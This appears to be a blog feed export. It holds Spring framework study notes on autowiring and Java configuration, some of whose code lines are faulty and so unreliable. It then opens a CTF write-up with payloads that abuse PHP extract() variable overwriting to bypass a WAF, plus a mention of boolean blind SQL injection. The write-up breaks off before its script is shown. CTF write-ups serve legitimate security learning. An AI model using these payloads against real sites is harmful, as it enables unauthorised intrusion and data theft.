<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Dog：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Person：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>beans.xml:</p>
<p>byName配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>byType：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>byName就是在上下文中寻找id和所需求匹配的值，而byType则是在上下文中去寻找和类型相同类</p>
<p>于是我又产生了一个疑惑，如果存在跨文件的情况呢？</p>
<p>于是我又创建了一个bean1.xml来储存</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<p>月石 miao wang</p>
<p>但是如果我把beans的注释之后呢</p>
<p>则是</p>
<p>dnm miao wang</p>
<p>这就说明，当我们使用beans.xml装配之后，系统会优先在当前xml来进行查找，之后才会去其他地方查找</p>
<p>除此之外我们需要记住：</p>
<ul>
<li>当我们使用byName的时候，必须保证当前bean的id唯一且正确</li>
<li>当我们使用byType的时候，必须保证当前bean的class唯一且正确</li>
</ul>
<h2 id="6-2使用注解实现自动装配"><a href="#6-2使用注解实现自动装配" class="headerlink" title="6.2使用注解实现自动装配"></a>6.2使用注解实现自动装配</h2><p>jdk1.5支持，spring2.5支持</p>
<p>使用注解须知：</p>
<ol>
<li>导入约束</li>
<li>配置注解的支持</li>
</ol>
<p>必须导入如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我们便可以对单个值进行注入。</p>
<p>在Person类当中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们使用atuowired注入之后，甚至连set方法都不需要构造了，为什么呢？</p>
<p>【据说是因为他利用反射的方式获取代码，我也不是很懂</p>
<p>如果bean当中的配置多起来了，我们想构造的话，就需要通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Qualifier(value = &quot;cat&quot;)</span></span><br></pre></td></tr></table></figure>

<p>显式的定义代码</p>
<h1 id="7-注解开发"><a href="#7-注解开发" class="headerlink" title="7.注解开发"></a>7.注解开发</h1><p>在Spring4之后，我们必须保证Spring的AOP包被导入</p>
<p>在使用注解的时候需要导入context约束，增加注解的支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<ol>
<li><p>bean</p>
<p>当我们使用注解之后，bean可以如下方法进入导入：</p>
<p>第一步，导入包：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步，去类的上面添加注释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意@Component，这个注解的意思等价于</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&#x27;user&#x27;</span> <span class="attr">class</span>=<span class="string">com.ys.pojo.user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>属性如何注入</p>
<p>使用类我们也是可以注入值的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br></pre></td></tr></table></figure>

<p>等价于：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是通过这我们就可以明白，注解注入值不适合注入复杂类型的值。</p>
</li>
<li><p>衍生的注解</p>
<p>通过@Component后面为了分层，我们衍生出了如下注解：</p>
<ul>
<li>Dao:  @Repository</li>
<li>Service:  @Service</li>
<li>Controller: @Controller</li>
</ul>
<p>这四个类的本质都没有区别，都代表注册一个bean去XML当中，只不过这样写可以使得我们MVC架构更加清晰明了</p>
</li>
<li><p>自动装配</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- <span class="meta">@Atuowired</span>: 自动装配</span><br><span class="line">- <span class="meta">@Nullable</span>： 允许字段为<span class="keyword">null</span></span><br><span class="line">- <span class="meta">@Resource</span>  ：通过名字，类型自动装配</span><br></pre></td></tr></table></figure>
</li>
<li><p>作用域</p>
<p>其实通过注解也可以对作用域进行注解，但是我觉得不是很方便。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Scope()</span></span><br></pre></td></tr></table></figure>

<p>为什么不通过XML呢？</p>
</li>
<li><p>小结</p>
</li>
</ol>
<p>在这章我们学会了利用注解进行开发，可以通过注解摆脱XML，但是我通过学习这一章节，我感觉Spring此时还是不够成熟，大部分的时候还是利用XML更加方便，复杂的东西丢给XML来做，简单的利用注解注入就行</p>
<p>所以最佳实践应该是：</p>
<ul>
<li>利用XML手动的建立每个bean，这样方便程序员的互相合作</li>
<li>XML注入MAP类型等</li>
<li>利用注释手动的注入简单值，降低开发成本</li>
</ul>
<p>同时我们还需要了解：</p>
<ul>
<li>XML的优势就在于他更加清楚明了，起码在Spring来说是这样的，同时XML还方便跨文件配合</li>
<li>而注解更加的方便我们进行开发，注入值，降低程序员的成本（但是增加了运维的难度</li>
</ul>
<p>使用注解开发的一个简单例子，还是一个人两个宠物：</p>
<p>🐱的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐱：wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>🐕的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line">org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐕：wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>人的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.getCat().shout();</span><br><span class="line">        user.getDog().shout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依然能够正常的得到结果~</p>
<h1 id="8-完全使用Java配置Spring"><a href="#8-完全使用Java配置Spring" class="headerlink" title="8 完全使用Java配置Spring"></a>8 完全使用Java配置Spring</h1><p>我们现在要完全使用Javaconfig完全的代替XML了，SpringBoot当中也是这样做的，我还是有点慌，感觉没有能够适应过来</p>
<p>还是很有必要将XML的方式和Java类的方式进行对比，如果我们想要使用Javaconfig来代替XML</p>
<p>构造如下Java代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用@Configuration的意思等同于：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> &gt;</span><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我们所有的配置都可以写在该类当中</p>
<p>@Component(“com.ys.pojo”)类等同于如下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>将两者之间进行进一步的对比，如果我们想要配置一个类的话：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个XML标签等同于：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那如何注入值呢？</p>
<p>在XML当中我们是这样操作的：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>而到了Javaconfig之中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br></pre></td></tr></table></figure>

<p>我们选择直接由类来注入值！</p>
<p>而Autowired依然没有变化，还是直接在包中寻找上下文的类~，比如我们尝试继续学习举例，一个人有一只猫和一个狗:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐱说：wdnmdb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐕说：wndmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们使用这种方式来创建之后，就没有地方来使用@Component这个注解了，因为我们没有XML呢？</p>
<p>总而言之我必须与做出这样的JavaConfig代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">cat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">dog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而我们的@Component就没有什么用武之地了..</p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>2020上海市网络安全大赛</title>
    <url>/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p>注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本</p>
<h1 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h1><p><img src="2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/QGuEzupA6iniGX9V.png!thumbnail" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162</span><br></pre></td></tr></table></figure>

<p>在这个🔗下我们可以找到的！利用比较简单，如果我们需要的参数在get上，可以构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code = xx</span><br><span class="line">_GET[code] =xx</span><br><span class="line">只需要两者保持一致即可</span><br></pre></td></tr></table></figure>

<p>如果在POST上，则反过来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[code] =xx</span><br><span class="line">code =xx</span><br></pre></td></tr></table></figure>



<p>由于$$key_2 == $value_2使得POST的值被unset了，绕过waf，后面再次extract造成变量覆盖 然后是布尔盲注，这里用–+代替#，不然会出现错误情况</p>
<p>队里师傅的脚本：</p>
